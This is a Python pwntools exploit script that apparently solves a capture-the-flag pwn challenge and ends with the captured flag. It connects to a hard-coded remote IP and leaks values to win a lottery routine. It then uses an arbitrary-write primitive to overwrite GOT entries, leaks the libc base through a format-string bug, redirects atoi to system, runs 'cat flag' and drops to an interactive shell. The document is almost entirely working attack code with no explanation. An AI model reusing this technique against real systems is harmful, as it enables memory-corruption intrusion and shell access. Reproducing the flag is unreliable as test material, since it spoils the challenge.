from pwn import *

io = remote('15.164.180.104', 11004)

def leakage():
        io.sendline(b'3')
        io.recvuntil(b'User Name : ')
        io.recvuntil(b'A'*0x30)
        leakage = io.recvn(8)
        return leakage

def lott(lott):
        io.sendline(b'1')
        io.sendlineafter(b'Your Number : ',str(lott))

def win_prize():
        for _ in range(90):
                rand = leakage()
                rand = u64(rand)
                print(b'random number :', hex(rand))
                lott(rand)
def aar(ptr,val):
        sleep(0.3)
        io.sendlineafter(b'[User Prompt]=>',b'4100')
        io.sendline(str(ptr))
        sleep(0.3)
        io.sendline(str(val))

name = b'A'*0x30
io.sendafter(b'Please enter a name :',name)
io.recvuntil(name)

win_prize()

exit_got = 0x404060
user_prompt = 0x401747
setbuf = 0x4012c3
printf_plt = 0x4010f0
atoi_got = 0x404058
lott = 0x4040f0
main = 4200167
system_off = 0x58750
pause()

#v4 값 초기화 ! -> AAR 여러번 가능.
aar(exit_got, main)

# exit 유도
io.sendlineafter(b'[User Prompt]=>',b'999')
sleep(0.5)
name = b'dretoh'
io.sendlineafter(b'Please enter a name :',name)

aar(atoi_got, printf_plt)
# Leakage
io.sendlineafter(b'[User Prompt]=>',b'%p%p%p')
data = io.recvline()[:-7][-14:]
data = int(data,16)
libB = data - 1161825
print(b'libc_base : ',hex(libB))
io.sendlineafter(b'Please enter a name :',name)

# 4100 길이의 출력 유도
data = b'%4100c'
io.sendlineafter(b'[User Prompt]=>',data)
io.sendline(str(atoi_got))
sleep(0.3)
io.sendline(str(libB+system_off))
io.sendline(b'cat flag')

io.interactive()
#lguplus2025{a3w_3nd_m3ke_f0rm3t_Str1n9_bu9}
